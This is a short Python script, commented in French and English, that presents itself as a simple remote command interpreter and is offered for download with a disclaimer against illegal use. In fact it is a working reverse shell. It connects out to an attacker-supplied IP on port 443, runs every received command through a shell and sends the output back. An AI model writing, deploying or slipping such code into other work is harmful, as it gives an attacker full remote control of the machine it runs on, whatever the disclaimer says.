import socket
import subprocess

# ce programme est un simple interpréteur de commande à distance,
# il ne doit en aucun cas être utilisé à des fin illégales,
# je ne serais pas tenu responsable de vos actes après le téléchargement de ce programme.

# this program is a simple remote command interpreter,
# it must in no case be used for illegal purposes,
# I would not be held responsible for your actions after downloading this program.

RHOST = "your ip"
RPORT = 443
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect((RHOST, RPORT))
c.send(b'connection good / ')
c.send(b'this program was created by @yoann39563945 from twitter / do not copy / ')
c.send(b'do not use for illegal action :')

while True:
    data = c.recv(1024)
    print(str(data, "utf-8"))
    com = subprocess.Popen(str(data, "utf-8"), shell=True, stdout=subprocess.PIPE)
    out, x = com.communicate()
    c.send(out)